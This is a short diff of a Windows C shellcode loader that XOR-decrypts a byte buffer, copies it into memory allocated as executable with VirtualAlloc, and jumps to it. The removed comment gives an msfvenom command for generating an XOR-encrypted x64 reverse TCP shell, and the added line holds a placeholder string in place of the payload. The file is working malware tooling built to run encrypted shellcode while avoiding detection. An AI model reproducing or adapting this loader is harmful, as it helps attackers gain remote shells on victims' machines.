@@ -1,8 +1,7 @@
 #include <windows.h>
 #include <stdio.h>
 
-// msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 --encrypt xor --encrypt-key test -f c -o enc.c
-unsigned char buf[] = "";
+unsigned char buf[] = "xored_payload";
 
 void x(char *payload, int payload_length, char *key, int length) {
 	int j = 0;
@@ -19,6 +18,8 @@ int main()
 {
 	char key[] = "test";
 	x((char*)buf, sizeof(buf), key, sizeof(key));	
+	
+	//From here on out the shellcode is decrypted and can be executed
 	void *exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	memcpy(exec, buf, sizeof(buf));
 	((void(*)())exec)();
